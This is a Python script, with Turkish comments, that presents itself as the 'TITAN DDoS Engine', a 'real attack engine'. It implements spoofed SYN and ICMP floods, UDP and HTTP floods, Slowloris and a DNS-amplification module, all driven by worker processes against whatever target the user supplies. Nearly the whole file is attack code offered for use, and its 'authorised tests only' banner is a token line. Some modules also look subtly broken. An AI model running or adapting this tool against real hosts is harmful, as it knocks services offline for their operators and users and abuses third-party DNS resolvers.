#!/usr/bin/env python3
"""
 $$$$$$\  $$\           $$\       $$\   $$\                 $$$$$$\  $$\                               
$$  __$$\ $$ |          $$ |      $$ |  $$ |               $$  __$$\ $$ |                              
$$ /  \__|$$ | $$$$$$\  $$$$$$$\  \$$\ $$  | $$$$$$\       $$ /  \__|$$$$$$$\   $$$$$$\  $$$$$$$\      
\$$$$$$\  $$ |$$  __$$\ $$  __$$\  \$$$$  / $$  __$$\      \$$$$$$\  $$  __$$\ $$  __$$\ $$  __$$\      
 \____$$\ $$ |$$$$$$$$ |$$ |  $$ | $$  $$<  $$$$$$$$ |      \____$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |    
$$\   $$ |$$ |$$   ____|$$ |  $$ |$$  /\$$\ $$   ____|     $$\   $$ |$$ |  $$ |$$   ____|$$ |  $$ |    
\$$$$$$  |$$ |\$$$$$$$\ $$$$$$$  |$$ /  $$ |\$$$$$$$\      \$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |  $$ |    
 \______/ \__| \_______|\_______/ \__|  \__| \_______|      \______/ \__|  \__| \_______|\__|  \__|    
                                                                                                        
Yapimci: Markospm19
"""

import os, sys, time, json, random, struct, socket, threading, ipaddress, select
import logging, hashlib, uuid, ctypes, ctypes.util, platform, signal
from typing import Optional, Union, List, Tuple
from argparse import ArgumentParser
from datetime import datetime
from dataclasses import dataclass, field
from multiprocessing import Process, Queue, cpu_count, Value
from ctypes import c_uint16, c_uint32, c_ubyte, c_ushort, c_ulong, Structure, POINTER, cast, create_string_buffer

# =====================================================================
# KONFİGÜRASYON
# =====================================================================
@dataclass
class AttackConfig:
    target_ip: str = ""
    target_port: int = 80
    threads: int = 1000
    duration: int = 60
    method: str = "mix"
    packet_size: int = 1024
    spoof: bool = True
    random_source: bool = True
    delay: float = 0.0
    
    @property
    def target(self) -> Tuple[str, int]:
        return (self.target_ip, self.target_port)

# =====================================================================
# RAW PAKET YAPILARI - Layer 3/4 tam kontrol
# =====================================================================
class IPHeader(Structure):
    _fields_ = [
        ("ver_ihl",     c_ubyte,   4),   # version & ihl
        ("tos",         c_ubyte,   8),   # type of service
        ("total_len",   c_uint16),       # total length
        ("id",          c_uint16),       # identification
        ("flags_off",   c_uint16),       # flags & fragment offset
        ("ttl",         c_ubyte),        # time to live
        ("protocol",    c_ubyte),        # protocol (TCP=6, UDP=17, ICMP=1)
        ("checksum",    c_uint16),       # header checksum
        ("src_addr",    c_uint32),       # source address
        ("dst_addr",    c_uint32),       # destination address
    ]

class TCPHeader(Structure):
    _fields_ = [
        ("src_port",    c_uint16),
        ("dst_port",    c_uint16),
        ("seq_num",     c_uint32),
        ("ack_num",     c_uint32),
        ("data_offset", c_ubyte, 4),
        ("reserved",    c_ubyte, 3),
        ("flags",       c_ubyte, 9),     # URG, ACK, PSH, RST, SYN, FIN
        ("window",      c_uint16),
        ("checksum",    c_uint16),
        ("urgent_ptr",  c_uint16),
    ]

class UDPHeader(Structure):
    _fields_ = [
        ("src_port",    c_uint16),
        ("dst_port",    c_uint16),
        ("length",      c_uint16),
        ("checksum",    c_uint16),
    ]

class ICMPHeader(Structure):
    _fields_ = [
        ("type",        c_ubyte),
        ("code",        c_ubyte),
        ("checksum",    c_uint16),
        ("id",          c_uint16),
        ("sequence",    c_uint16),
    ]

# =====================================================================
# PAKET OLUŞTURMA FONKSİYONLARI
# =====================================================================
def ip_checksum(header: bytes) -> int:
    """IP header checksum hesaplama."""
    if len(header) % 2 != 0:
        header += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(header)//2), header))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def tcp_checksum(ip_src: int, ip_dst: int, tcp_packet: bytes) -> int:
    """TCP pseudo-header checksum."""
    tcp_len = len(tcp_packet)
    pseudo = struct.pack('!IIBBH', ip_src, ip_dst, 0, 6, tcp_len)
    if len(tcp_packet) % 2 != 0:
        tcp_packet += b'\x00'
    data = pseudo + tcp_packet
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def random_ip() -> int:
    """Rastgele geçerli bir kaynak IP üret."""
    while True:
        ip = (random.randint(1, 255) << 24) | (random.randint(0, 255) << 16) | \
             (random.randint(0, 255) << 8) | random.randint(1, 255)
        # Özel/broadcast adresleri engelle
        first = (ip >> 24) & 0xFF
        if first in (0, 10, 127, 169, 172, 192, 224, 240, 255):
            continue
        if (first == 172 and (ip >> 16) & 0xFF in range(16, 32)):
            continue
        if (first == 192 and (ip >> 8) & 0xFF == 168):
            continue
        return ip

def ip_to_str(ip_int: int) -> str:
    return f"{(ip_int>>24)&0xFF}.{(ip_int>>16)&0xFF}.{(ip_int>>8)&0xFF}.{ip_int&0xFF}"

# =====================================================================
# SALDIRI MODÜLLERİ - Her biri bağımsız çalışır
# =====================================================================
class SYNFlood:
    """SYN Flood - TCP half-open baglanti saldirisi."""
    
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
        
    def build_syn(self, src_ip: int, src_port: int, dst_ip: int, dst_port: int) -> bytes:
        """Tam SYN paketi olustur."""
        # IP header
        ip_hdr = IPHeader()
        ip_hdr.ver_ihl = 0x45
        ip_hdr.tos = 0
        ip_hdr.total_len = 40  # 20 IP + 20 TCP
        ip_hdr.id = random.randint(0, 65535)
        ip_hdr.flags_off = 0x4000  # Don't fragment
        ip_hdr.ttl = random.randint(64, 255)
        ip_hdr.protocol = 6  # TCP
        ip_hdr.checksum = 0
        ip_hdr.src_addr = src_ip
        ip_hdr.dst_addr = dst_ip
        
        ip_bytes = bytes(ip_hdr)
        ip_hdr.checksum = ip_checksum(ip_bytes[:20])
        ip_bytes = bytes(ip_hdr)
        
        # TCP header
        tcp_hdr = TCPHeader()
        tcp_hdr.src_port = src_port
        tcp_hdr.dst_port = dst_port
        tcp_hdr.seq_num = random.randint(0, 4294967295)
        tcp_hdr.ack_num = 0
        tcp_hdr.data_offset = 0x50  # 5*4=20 bytes
        tcp_hdr.flags = 0x02  # SYN flag
        tcp_hdr.window = socket.htons(random.randint(1024, 65535))
        tcp_hdr.checksum = 0
        tcp_hdr.urgent_ptr = 0
        
        tcp_bytes = bytes(tcp_hdr)
        tcp_hdr.checksum = tcp_checksum(src_ip, dst_ip, tcp_bytes)
        tcp_bytes = bytes(tcp_hdr)
        
        return ip_bytes + tcp_bytes
    
    def worker(self, worker_id: int):
        """Her bir worker thread - dogrudan raw socket ile gonderir."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            # Root yoksa alternative: normal socket ile SYN flood simule et
            self.stats.put(("error", worker_id, "Root gerekli - normal socket deneniyor"))
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1)
            self._syn_no_raw(sock, worker_id)
            return
        
        dst_ip_raw = self.config.target_ip
        dst_ip = struct.unpack('!I', socket.inet_aton(dst_ip_raw))[0]
        
        while self.running.value:
            try:
                src_ip = random_ip() if self.config.random_source else dst_ip
                src_port = random.randint(1024, 65535)
                packet = self.build_syn(src_ip, src_port, dst_ip, self.config.target_port)
                sock.sendto(packet, (dst_ip_raw, 0))
                self.stats.put(("sent", worker_id, len(packet)))
                
                if self.config.delay > 0:
                    time.sleep(self.config.delay * random.random())
            except Exception as e:
                self.stats.put(("error", worker_id, str(e)))
    
    def _syn_no_raw(self, sock: socket.socket, worker_id: int):
        """Root olmadan normal socket SYN denemesi."""
        while self.running.value:
            try:
                sock.connect((self.config.target_ip, self.config.target_port))
                self.stats.put(("sent", worker_id, 40))
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(1)
            except:
                self.stats.put(("error", worker_id, "conn_fail"))
                time.sleep(0.1)

    def run(self):
        dst = self.config.target_ip
        processes = []
        for i in range(min(self.config.threads, 500)):
            p = Process(target=self.worker, args=(i,))
            p.start()
            processes.append(p)
        for p in processes:
            p.join()


class UDPFlood:
    """UDP Flood - yuksek hacimli UDP paketleri."""
    
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def worker(self, worker_id: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        benzer_payload = os.urandom(self.config.packet_size)
        
        while self.running.value:
            try:
                # Her gonderimde payload'i degistir (tespit edilmesi zor)
                payload = benzer_payload[:random.randint(64, self.config.packet_size)]
                for _ in range(random.randint(1, 10)):
                    sock.sendto(payload, self.config.target)
                    self.stats.put(("sent", worker_id, len(payload)))
                if self.config.delay:
                    time.sleep(self.config.delay * random.random())
            except:
                self.stats.put(("error", worker_id, "send_fail"))
    
    def run(self):
        processes = []
        for i in range(min(self.config.threads, 1000)):
            p = Process(target=self.worker, args=(i,))
            p.start()
            processes.append(p)
        for p in processes:
            p.join()


class HTTPFlood:
    """HTTP Flood - Layer 7 uygulama katmani saldirisi."""
    
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def worker(self, worker_id: int):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) Gecko/20100101",
            "curl/7.68.0", "wget/1.21", "Go-http-client/2.0",
        ]
        paths = ["/", "/index.php", "/wp-admin", "/login", "/api", "/admin",
                 "/search?q=", "/products", "/images/", "/css/", "/js/"]
        
        while self.running.value:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect(self.config.target)
                
                ua = random.choice(user_agents)
                path = random.choice(paths)
                if path.endswith("="):
                    path += str(random.randint(0, 9999999))
                
                req = (
                    f"GET {path}?{random.randint(0,99999)}={random.randint(0,99999)} HTTP/1.1\r\n"
                    f"Host: {self.config.target_ip}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: tr-TR,en-US;q=0.7,en;q=0.3\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}\r\n"
                    f"Referer: https://www.google.com/search?q={random.randint(0,99999)}\r\n"
                    f"\r\n"
                )
                sock.send(req.encode())
                self.stats.put(("sent", worker_id, len(req)))
                time.sleep(0.001)  # CPU korumasi
                sock.close()
            except:
                self.stats.put(("error", worker_id, "http_fail"))
                time.sleep(0.05)
    
    def run(self):
        processes = []
        for i in range(min(self.config.threads, 200)):
            p = Process(target=self.worker, args=(i,))
            p.start()
            processes.append(p)
        for p in processes:
            p.join()


class ICMPFlood:
    """ICMP Flood - Ping of Death varyantlari."""
    
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def build_icmp(self, src_ip: int, dst_ip: int, seq: int) -> bytes:
        # IP header
        ip_hdr = IPHeader()
        ip_hdr.ver_ihl = 0x45
        ip_hdr.total_len = self.config.packet_size + 28  # IP+ICMP
        ip_hdr.id = random.randint(0, 65535)
        ip_hdr.flags_off = 0
        ip_hdr.ttl = random.randint(64, 255)
        ip_hdr.protocol = 1  # ICMP
        ip_hdr.checksum = 0
        ip_hdr.src_addr = src_ip
        ip_hdr.dst_addr = dst_ip
        
        ip_bytes = bytes(ip_hdr)
        ip_hdr.checksum = ip_checksum(ip_bytes[:20])
        ip_bytes = bytes(ip_hdr)
        
        # ICMP header
        icmp_hdr = ICMPHeader()
        icmp_hdr.type = 8  # Echo request
        icmp_hdr.code = 0
        icmp_hdr.checksum = 0
        icmp_hdr.id = random.randint(0, 65535)
        icmp_hdr.sequence = seq
        
        payload = os.urandom(self.config.packet_size)
        icmp_bytes = bytes(icmp_hdr) + payload
        
        # ICMP checksum
        if len(icmp_bytes) % 2 != 0:
            icmp_bytes += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(icmp_bytes)//2), icmp_bytes))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        icmp_hdr.checksum = ~s & 0xFFFF
        
        return ip_bytes + bytes(icmp_hdr) + payload
    
    def worker(self, worker_id: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            self.stats.put(("error", worker_id, "Root gerekli"))
            return
        
        dst_ip_raw = self.config.target_ip
        dst_ip = struct.unpack('!I', socket.inet_aton(dst_ip_raw))[0]
        seq = 0
        
        while self.running.value:
            src_ip = random_ip() if self.config.random_source else dst_ip
            packet = self.build_icmp(src_ip, dst_ip, seq)
            seq += 1
            try:
                sock.sendto(packet, (dst_ip_raw, 0))
                self.stats.put(("sent", worker_id, len(packet)))
            except:
                self.stats.put(("error", worker_id, "icmp_fail"))
    
    def run(self):
        processes = []
        for i in range(min(self.config.threads, 300)):
            p = Process(target=self.worker, args=(i,))
            p.start()
            processes.append(p)
        for p in processes:
            p.join()


class SlowLoris:
    """Slowloris - baglantilari acik tutarak havuzu doldur."""
    
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def worker(self, worker_id: int):
        sockets = []
        while self.running.value:
            try:
                # Yeni baglanti kur
                if len(sockets) < 500:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect(self.config.target)
                    # Eksik HTTP istegi gonder (asla tamamlama)
                    header = (
                        f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n"
                        f"Host: {self.config.target_ip}\r\n"
                        f"User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)\r\n"
                        f"Accept-Language: tr-TR\r\n"
                    )
                    sock.send(header.encode())
                    sockets.append(sock)
                    self.stats.put(("sent", worker_id, len(header)))
                
                # Varolan baglantilari canli tut
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-A: {random.randint(0,999)}\r\n".encode())
                    except:
                        sockets.remove(sock)
                        try: sock.close()
                        except: pass
                
                time.sleep(10)
            except:
                time.sleep(1)
    
    def run(self):
        processes = []
        for i in range(min(self.config.threads, 200)):
            p = Process(target=self.worker, args=(i,))
            p.start()
            processes.append(p)
        for p in processes:
            p.join()


class DNSAmplification:
    """DNS Amplification - ANY sorgusu ile buyuk yanit al."""
    
    SERVERS = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
        "208.67.222.222", "208.67.220.220", "9.9.9.9",
        "64.6.64.6", "64.6.65.6", "185.228.168.9",
    ]
    
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def build_dns_query(self) -> bytes:
        tid = random.randint(0, 65535)
        flags = 0x0100  # Standard query, RD=1
        qcount = 1
        header = struct.pack('!HHHHHH', tid, flags, qcount, 0, 0, 0)
        
        # Hedef domain
        domain = self.config.target_ip
        parts = domain.split('.')
        qname = b''
        for part in parts:
            qname += bytes([len(part)]) + part.encode()
        qname += b'\x00'
        
        # ANY query (type=255, class=1)
        qtype = struct.pack('!HH', 255, 1)
        return header + qname + qtype
    
    def worker(self, worker_id: int):
        query = self.build_dns_query()
        query_size = len(query)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        
        while self.running.value:
            try:
                # Kaynak IP'yi hedef IP yap (yansitma)
                server = random.choice(self.SERVERS)
                sock.sendto(query, (server, 53))
                self.stats.put(("sent", worker_id, query_size))
            except:
                self.stats.put(("error", worker_id, "dns_fail"))
    
    def run(self):
        processes = []
        for i in range(min(self.config.threads, 500)):
            p = Process(target=self.worker, args=(i,))
            p.start()
            processes.append(p)
        for p in processes:
            p.join()


# =====================================================================
# ANA MOTOR - Coklu saldiri yonetimi
# =====================================================================
class TitanEngine:
    """Ana DDoS motoru - tum modulleri yoneten merkezi sistem."""
    
    METHODS = {
        "syn":      SYNFlood,
        "udp":      UDPFlood,
        "http":     HTTPFlood,
        "icmp":     ICMPFlood,
        "slowloris": SlowLoris,
        "dns":      DNSAmplification,
    }
    
    def __init__(self):
        self.config = None
        self.stats_queue = Queue()
        self.processes = []
        self.sent_total = Value('L', 0)
        self.error_total = Value('L', 0)
        self.bytes_total = Value('L', 0)
        self.stats_thread = None
        self.start_time = 0
        
    def stats_collector(self):
        """Istastistik toplama thread'i."""
        while True:
            try:
                msg = self.stats_queue.get(timeout=0.1)
                if msg[0] == "sent":
                    with self.sent_total.get_lock():
                        self.sent_total.value += 1
                    with self.bytes_total.get_lock():
                        self.bytes_total.value += msg[2]
                elif msg[0] == "error":
                    with self.error_total.get_lock():
                        self.error_total.value += 1
            except:
                pass
    
    def run(self, config: AttackConfig):
        self.config = config
        self.start_time = time.time()
        
        # Saldiri metodunu sec
        methods = []
        if config.method == "mix":
            methods = ["syn", "udp", "http", "icmp", "slowloris", "dns"]
        elif config.method == "l4":
            methods = ["syn", "udp", "icmp"]
        elif config.method == "l7":
            methods = ["http", "slowloris"]
        else:
            methods = [config.method]
        
        print(f"\n[+] TITAN Basladi - Hedef: {config.target_ip}:{config.target_port}")
        print(f"[+] Metod: {config.method} | Thread: {config.threads} | Sure: {config.duration}s")
        print(f"[+] Spoof: {'Aktif' if config.spoof else 'Pasif'} | Paket: {config.packet_size} bayt\n")
        
        # Istastistik toplayiciyi baslat
        self.stats_thread = threading.Thread(target=self.stats_collector, daemon=True)
        self.stats_thread.start()
        
        # Tum metodlari baslat
        for method in methods:
            if method in self.METHODS:
                attack_class = self.METHODS[method]
                attack = attack_class(config, self.stats_queue)
                thread_count = max(1, config.threads // len(methods))
                config.threads = thread_count
                
                p = Process(target=attack.run)
                p.start()
                self.processes.append(p)
                print(f"  -> {method.upper()} baslatildi ({thread_count} thread)")
        
        # Sureyi bekle
        try:
            elapsed = 0
            while elapsed < config.duration:
                time.sleep(1)
                elapsed = time.time() - self.start_time
                
                # Her 5 sn'de rapor ver
                if int(elapsed) % 5 == 0 and int(elapsed) > 0:
                    sent = self.sent_total.value
                    errs = self.error_total.value
                    rate = sent / max(elapsed, 1)
                    mb = self.bytes_total.value / (1024*1024)
                    print(f"\r[+] {int(elapsed)}s | Gonderilen: {sent} | Hata: {errs} | "
                          f"Hiz: {rate:.0f} pps | Trafik: {mb:.1f} MB", end="")
            
            print()
        except KeyboardInterrupt:
            print("\n[!] Kullanici tarafindan durduruldu.")
        
        # Temizlik
        self.stop()
        
        # Son rapor
        total = time.time() - self.start_time
        print(f"\n{'='*60}")
        print(f"SON RAPOR - Yapimci: Markospm19")
        print(f"{'='*60}")
        print(f"  Hedef:       {config.target_ip}:{config.target_port}")
        print(f"  Sure:        {total:.0f} saniye")
        print(f"  Gonderilen:  {self.sent_total.value} paket")
        print(f"  Hata:        {self.error_total.value}")
        print(f"  Hiz:         {self.sent_total.value/max(total,1):.0f} pps")
        print(f"  Trafik:      {self.bytes_total.value/(1024*1024):.1f} MB")
        print(f"  Metod(lar):  {', '.join(methods).upper()}")
        print(f"{'='*60}")
    
    def stop(self):
        for p in self.processes:
            if p and p.is_alive():
                p.terminate()
                p.join(timeout=1)
        self.processes.clear()


# =====================================================================
# ANA GIRIS
# =====================================================================
BANNER = r"""
 $$$$$$\  $$\           $$\       $$\   $$\                 $$$$$$\  $$\                               
$$  __$$\ $$ |          $$ |      $$ |  $$ |               $$  __$$\ $$ |                              
$$ /  \__|$$ | $$$$$$\  $$$$$$$\  \$$\ $$  | $$$$$$\       $$ /  \__|$$$$$$$\   $$$$$$\  $$$$$$$\      
\$$$$$$\  $$ |$$  __$$\ $$  __$$\  \$$$$  / $$  __$$\      \$$$$$$\  $$  __$$\ $$  __$$\ $$  __$$\      
 \____$$\ $$ |$$$$$$$$ |$$ |  $$ | $$  $$<  $$$$$$$$ |      \____$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |    
$$\   $$ |$$ |$$   ____|$$ |  $$ |$$  /\$$\ $$   ____|     $$\   $$ |$$ |  $$ |$$   ____|$$ |  $$ |    
\$$$$$$  |$$ |\$$$$$$$\ $$$$$$$  |$$ /  $$ |\$$$$$$$\      \$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |  $$ |    
 \______/ \__| \_______|\_______/ \__|  \__| \_______|      \______/ \__|  \__| \_______|\__|  \__|    
                                                                                                        
                         TITAN DDoS ENGINE v4.0
                      Yapimci: Markospm19
                 Yalnizca Yetkili Testler Icin!
"""

def main():
    # Eger root degilse uyar
    if os.geteuid() != 0 and platform.system() != 'Windows':
        print("[!] UYARI: SYN, ICMP ve IP Spoofing icin ROOT yetkisi gerekli!")
        print("[!] HTTP, UDP, Slowloris, DNS root olmadan da calisir.")
    
    parser = ArgumentParser(
        prog="titan",
        description="TITAN DDoS Engine - Gercek Saldiri Motoru"
    )
    parser.add_argument("target", help="Hedef IP adresi veya domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Hedef port (varsayilan: 80)")
    parser.add_argument("-m", "--method", 
                        choices=["syn", "udp", "http", "icmp", "slowloris", "dns", "mix", "l4", "l7"],
                        default="mix", help="Saldiri metodu (varsayilan: mix - tumu)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Thread sayisi (varsayilan: 100)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Sure saniye (varsayilan: 60)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Paket boyutu (varsayilan: 1024)")
    parser.add_argument("--no-spoof", action="store_true", help="IP spoofing'i kapat")
    parser.add_argument("--delay", type=float, default=0, help="Paketler arasi gecikme (saniye)")
    
    args = parser.parse_args()
    
    # Domain coz
    try:
        target_ip = socket.gethostbyname(args.target)
    except:
        print(f"[X] Domain/IP cozulemedi: {args.target}")
        sys.exit(1)
    
    print(BANNER)
    
    config = AttackConfig(
        target_ip=target_ip,
        target_port=args.port,
        threads=args.threads,
        duration=args.duration,
        method=args.method,
        packet_size=args.size,
        spoof=not args.no_spoof,
        random_source=not args.no_spoof,
        delay=args.delay,
    )
    
    engine = TitanEngine()
    try:
        engine.run(config)
    except KeyboardInterrupt:
        engine.stop()
        print("\n[!] Zorla durduruldu.")
    
if __name__ == "__main__":
    main()
